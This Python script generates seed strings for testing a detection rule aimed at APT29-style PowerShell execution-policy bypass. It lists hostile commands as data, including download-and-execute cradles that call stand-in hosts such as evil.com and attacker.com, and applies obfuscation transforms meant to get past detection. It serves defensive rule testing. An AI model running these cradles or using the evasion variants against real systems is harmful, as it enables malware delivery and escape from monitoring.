"""
Generate comprehensive seed collection for apt29_powershell_bypass rule
Based on 5 evasion techniques + APT29 TTPs
"""
import json
from pathlib import Path
from typing import List, Dict

class APT29SeedGenerator:
    def __init__(self):
        self.seed_id_counter = 1
        
    def create_seed(self, command: str, technique: str = "base") -> Dict:
        """Create seed with metadata"""
        seed = {
            "id": f"apt29_seed_{self.seed_id_counter:03d}",
            "string": command,
            "q_s": 0.1,
            "n_s": 0,
            "invalid_count": 0,
            "cluster_id": 1,
            "technique": technique,
            "last_used": 0
        }
        self.seed_id_counter += 1
        return seed
    
    def generate_base_seeds(self) -> List[Dict]:
        """Base PowerShell commands (known APT29 patterns)"""
        base_commands = [
            # ExecutionPolicy bypass variants
            "powershell.exe -ep bypass -c whoami",
            "powershell.exe -ExecutionPolicy bypass -Command Get-Process",
            "powershell -exec bypass -nop -c \"IEX((New-Object Net.WebClient).DownloadString('http://evil.com/payload'))\"",
            
            # Encoded commands
            "powershell.exe -nop -w hidden -enc V2hvYW1p",
            "powershell -EncodedCommand R2V0LVByb2Nlc3M=",
            
            # Hidden window + bypass
            "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command whoami",
            "powershell -w hidden -ep bypass -c Get-Service",
            
            # NoProfile + bypass
            "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Get-Host",
            "powershell -nop -ep bypass -c [System.Environment]::OSVersion",
            
            # Download cradles
            "powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')",
            "powershell -c \"Invoke-WebRequest -Uri http://evil.com/malware.exe -OutFile C:\\temp\\malware.exe\"",
            
            # Obfuscated bypass
            "powershell.exe -ex bypass -c whoami",
            "powershell -executionpolicy bypass -command whoami",
        ]
        
        return [self.create_seed(cmd, "base") for cmd in base_commands]
    
    def apply_insertion(self, base_seeds: List[Dict]) -> List[Dict]:
        """Technique 1: Insert characters between keywords"""
        variants = []
        
        for seed in base_seeds[:5]:  # Apply to first 5 base seeds
            cmd = seed["string"]
            
            # Insert quotes around flags
            if "-ep" in cmd:
                variants.append(self.create_seed(
                    cmd.replace("-ep", '"-ep"'),
                    "insertion_quotes"
                ))
            
            # Insert double quotes inside
            if "bypass" in cmd.lower():
                variants.append(self.create_seed(
                    cmd.replace("bypass", 'by""pass'),
                    "insertion_double_quotes"
                ))
            
            # Insert spaces
            if "-ExecutionPolicy" in cmd:
                variants.append(self.create_seed(
                    cmd.replace("-ExecutionPolicy", "-Execution  Policy"),
                    "insertion_spaces"
                ))
        
        return variants
    
    def apply_substitution(self, base_seeds: List[Dict]) -> List[Dict]:
        """Technique 2: Replace with equivalent forms"""
        variants = []
        
        substitutions = [
            # Short → Long form
            ("-ep", "-ExecutionPolicy"),
            ("-ex", "-ExecutionPolicy"),
            ("-enc", "-EncodedCommand"),
            ("-w", "-WindowStyle"),
            ("-nop", "-NoProfile"),
            ("-c", "-Command"),
            
            # Long → Short form (reverse)
            ("-ExecutionPolicy", "-ep"),
            ("-EncodedCommand", "-enc"),
            ("-WindowStyle", "-w"),
            ("-NoProfile", "-nop"),
            ("-Command", "-c"),
            
            # Case variations
            ("bypass", "Bypass"),
            ("hidden", "Hidden"),
            ("whoami", "WHOAMI"),
        ]
        
        for seed in base_seeds[:8]:
            cmd = seed["string"]
            
            for short, long in substitutions:
                if short in cmd:
                    variants.append(self.create_seed(
                        cmd.replace(short, long, 1),
                        f"substitution_{short.replace('-', '')}"
                    ))
                    break  # One substitution per seed
        
        return variants
    
    def apply_omission(self, base_seeds: List[Dict]) -> List[Dict]:
        """Technique 3: Remove non-essential parts"""
        variants = []
        
        for seed in base_seeds[:6]:
            cmd = seed["string"]
            
            # Remove .exe extension
            if "powershell.exe" in cmd:
                variants.append(self.create_seed(
                    cmd.replace("powershell.exe", "powershell"),
                    "omission_exe"
                ))
            
            # Remove path (if C:\Windows\System32\ exists)
            if "C:\\Windows\\System32\\powershell" in cmd:
                variants.append(self.create_seed(
                    cmd.replace("C:\\Windows\\System32\\", ""),
                    "omission_path"
                ))
            
            # Remove optional -NoProfile
            if "-NoProfile" in cmd or "-nop" in cmd:
                variant_cmd = cmd.replace("-NoProfile", "").replace("-nop", "")
                variant_cmd = " ".join(variant_cmd.split())  # Normalize spaces
                variants.append(self.create_seed(
                    variant_cmd,
                    "omission_noprofile"
                ))
        
        return variants
    
    def apply_reordering(self, base_seeds: List[Dict]) -> List[Dict]:
        """Technique 4: Reorder arguments"""
        variants = []
        
        for seed in base_seeds[:5]:
            cmd = seed["string"]
            parts = cmd.split()
            
            if len(parts) < 4:
                continue
            
            # Find executable and flags
            exe_idx = 0
            flags = []
            flag_indices = []
            
            for i, part in enumerate(parts):
                if part.startswith('-'):
                    flags.append(part)
                    flag_indices.append(i)
            
            if len(flags) >= 2:
                # Swap first two flags
                new_parts = parts.copy()
                new_parts[flag_indices[0]], new_parts[flag_indices[1]] = \
                    new_parts[flag_indices[1]], new_parts[flag_indices[0]]
                
                variants.append(self.create_seed(
                    " ".join(new_parts),
                    "reordering_swap_flags"
                ))
                
                # Move last flag to front
                if len(flags) >= 2:
                    new_parts = parts.copy()
                    last_flag = new_parts.pop(flag_indices[-1])
                    new_parts.insert(1, last_flag)
                    
                    variants.append(self.create_seed(
                        " ".join(new_parts),
                        "reordering_move_last"
                    ))
        
        return variants
    
    def apply_recoding(self, base_seeds: List[Dict]) -> List[Dict]:
        """Technique 5: Encode values"""
        variants = []
        
        for seed in base_seeds[:4]:
            cmd = seed["string"]
            
            # Base64 encode simple commands
            if "whoami" in cmd and "-enc" not in cmd:
                # Base64("whoami") = d2hvYW1p
                encoded_cmd = cmd.replace(
                    "whoami",
                    "-EncodedCommand d2hvYW1p"
                )
                variants.append(self.create_seed(
                    encoded_cmd,
                    "recoding_base64"
                ))
            
            # IP encoding (if URL exists)
            if "http://" in cmd:
                # 192.168.1.1 → 3232235777
                if "192.168.1.1" in cmd:
                    variants.append(self.create_seed(
                        cmd.replace("192.168.1.1", "3232235777"),
                        "recoding_ip_decimal"
                    ))
        
        return variants
    
    def apply_traditional_obfuscation(self, base_seeds: List[Dict]) -> List[Dict]:
        """Traditional obfuscation: caret, case, quotes, env vars"""
        variants = []
        
        for seed in base_seeds[:10]:
            cmd = seed["string"]
            
            # Caret insertion (Windows CMD)
            if "powershell" in cmd.lower():
                variants.append(self.create_seed(
                    cmd.replace("powershell", "po^wer^shell", 1),
                    "traditional_caret"
                ))
            
            # Case mixing
            case_mixed = ""
            for i, c in enumerate(cmd):
                case_mixed += c.upper() if i % 2 == 0 else c.lower()
            variants.append(self.create_seed(
                case_mixed,
                "traditional_case_mixing"
            ))
            
            # Quote wrapping
            if cmd.startswith("powershell"):
                variants.append(self.create_seed(
                    cmd.replace("powershell", '"powershell"', 1),
                    "traditional_quotes"
                ))
            
            # Environment variable
            variants.append(self.create_seed(
                cmd.replace("powershell", "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell", 1),
                "traditional_env_var"
            ))
        
        return variants
    
    def apply_hybrid_combinations(self, base_seeds: List[Dict]) -> List[Dict]:
        """Combine multiple techniques"""
        variants = []
        
        for seed in base_seeds[:5]:
            cmd = seed["string"]
            
            # Hybrid 1: Omission + Substitution
            if "powershell.exe" in cmd and "-ep" in cmd:
                hybrid = cmd.replace("powershell.exe", "powershell") \
                           .replace("-ep", "-ExecutionPolicy")
                variants.append(self.create_seed(
                    hybrid,
                    "hybrid_omission_substitution"
                ))
            
            # Hybrid 2: Caret + Case mixing
            if "powershell" in cmd.lower():
                hybrid = cmd.replace("powershell", "Po^WeR^sHeLl", 1)
                variants.append(self.create_seed(
                    hybrid,
                    "hybrid_caret_case"
                ))
            
            # Hybrid 3: Insertion + Reordering
            if "-ep bypass" in cmd:
                hybrid = cmd.replace("-ep bypass", 'bypass "-ep"')
                variants.append(self.create_seed(
                    hybrid,
                    "hybrid_insertion_reorder"
                ))
        
        return variants
    
    def generate_all(self) -> List[Dict]:
        """Generate comprehensive seed collection"""
        all_seeds = []
        
        print("[*] Generating base seeds...")
        base_seeds = self.generate_base_seeds()
        all_seeds.extend(base_seeds)
        print(f"    Base seeds: {len(base_seeds)}")
        
        print("[*] Applying Technique 1: Insertion...")
        insertion_seeds = self.apply_insertion(base_seeds)
        all_seeds.extend(insertion_seeds)
        print(f"    Insertion variants: {len(insertion_seeds)}")
        
        print("[*] Applying Technique 2: Substitution...")
        substitution_seeds = self.apply_substitution(base_seeds)
        all_seeds.extend(substitution_seeds)
        print(f"    Substitution variants: {len(substitution_seeds)}")
        
        print("[*] Applying Technique 3: Omission...")
        omission_seeds = self.apply_omission(base_seeds)
        all_seeds.extend(omission_seeds)
        print(f"    Omission variants: {len(omission_seeds)}")
        
        print("[*] Applying Technique 4: Reordering...")
        reordering_seeds = self.apply_reordering(base_seeds)
        all_seeds.extend(reordering_seeds)
        print(f"    Reordering variants: {len(reordering_seeds)}")
        
        print("[*] Applying Technique 5: Recoding...")
        recoding_seeds = self.apply_recoding(base_seeds)
        all_seeds.extend(recoding_seeds)
        print(f"    Recoding variants: {len(recoding_seeds)}")
        
        print("[*] Applying traditional obfuscation...")
        traditional_seeds = self.apply_traditional_obfuscation(base_seeds)
        all_seeds.extend(traditional_seeds)
        print(f"    Traditional variants: {len(traditional_seeds)}")
        
        print("[*] Generating hybrid combinations...")
        hybrid_seeds = self.apply_hybrid_combinations(base_seeds)
        all_seeds.extend(hybrid_seeds)
        print(f"    Hybrid variants: {len(hybrid_seeds)}")
        
        return all_seeds

def save_seeds_json(seeds: List[Dict], output_file: Path):
    """Save seeds in JSON format"""
    with open(output_file, 'w', encoding='utf-8') as f:
        json.dump({"seeds": seeds}, f, indent=2, ensure_ascii=False)

def save_seeds_txt(seeds: List[Dict], output_file: Path):
    """Save seeds in plain text format (backward compatibility)"""
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write("# Enhanced seeds for apt29_powershell_bypass\n")
        f.write(f"# Generated with 5 evasion techniques + APT29 TTPs\n")
        f.write(f"# Total: {len(seeds)} seeds\n\n")
        
        for seed in seeds:
            f.write(f"# {seed['technique']}\n")
            f.write(f"{seed['string']}\n")

def main():
    output_dir = Path(__file__).parent.parent / "conf" / "seeds"
    output_dir.mkdir(parents=True, exist_ok=True)
    
    generator = APT29SeedGenerator()
    
    print("="*70)
    print("APT29 PowerShell Bypass - Enhanced Seed Generation")
    print("="*70 + "\n")
    
    seeds = generator.generate_all()
    
    # Save in both formats
    json_file = output_dir / "apt29_powershell_bypass.json"
    txt_file = output_dir / "apt29_powershell_bypass.txt"
    
    save_seeds_json(seeds, json_file)
    save_seeds_txt(seeds, txt_file)
    
    print("\n" + "="*70)
    print(f"[+] Generated {len(seeds)} seeds")
    print(f"[+] Saved to:")
    print(f"    JSON: {json_file}")
    print(f"    TXT:  {txt_file}")
    print("="*70)
    
    # Print statistics
    techniques = {}
    for seed in seeds:
        tech = seed["technique"]
        techniques[tech] = techniques.get(tech, 0) + 1
    
    print("\n[*] Seed Distribution:")
    for tech, count in sorted(techniques.items(), key=lambda x: -x[1]):
        print(f"    {tech:30s}: {count:3d} ({count/len(seeds)*100:.1f}%)")

if __name__ == "__main__":
    main()